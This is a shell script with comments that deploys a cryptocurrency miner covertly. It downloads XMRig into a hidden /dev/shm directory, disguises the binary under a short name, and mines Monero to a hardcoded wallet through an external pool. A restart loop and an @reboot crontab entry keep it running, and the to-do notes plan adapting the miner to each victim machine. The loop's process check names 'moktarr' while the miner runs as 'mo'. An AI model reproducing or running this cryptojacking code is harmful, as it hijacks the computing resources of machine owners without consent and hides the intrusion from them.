# Hide in sensible location
mkdir /dev/shm/.f && wget -O /dev/shm/.f/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/.f/xmrig.tar.gz -C /dev/shm/.f/ && rm -f /dev/shm/.f/xmrig.tar.gz && mv /dev/shm/.f/xmrig /dev/shm/.f/mo
# straight launch
/dev/shm/.f/mo --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_333! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50


# STEP 1 create javx.sh = LOADER  --> hide file in /tmp/...

MINER_PATH="/dev/shm/.f/mo"
CMD="$MINER_PATH --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_333! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50"

LAST_REFRESH=$(date +%s)

while true; do
    CURRENT_TIME=$(date +%s)
    ELAPSED=$((CURRENT_TIME - LAST_REFRESH))

    if [ $ELAPSED -gt 43200 ]; then
        pkill -x mo
        LAST_REFRESH=$CURRENT_TIME
        sleep 5
    fi

    if ! pgrep -x "moktarr" > /dev/null; then
        $CMD > /dev/null 2>&1 &
    fi

    sleep 600
done

# STEP 2
#How to use it:

#    Make it executable: chmod +x javx.sh
#    if containers and not user just ./javx.sh
 #   Run it in the background: To keep it running even after you close your terminal, use screen (pre-installed on Ubuntu):
  #      Type screen to open a new session.
   #     Run the script: ./javx.sh
    #    Press Ctrl + A then D to detach.
    #Add it to your User Crontab: Type crontab -e and add this single line at the bottom:  @reboot /bin/bash /tmp/.Test-unix/javx.sh
    #The script is now the boss: It will check the miner every 10 minutes. If XMRig dies, the script starts it back up.

# TO DO 
# add architectur detection & auto download & auto look up active machine to adapt name & auto cpu check to use 2 or less core ;threads-hint & pages 120
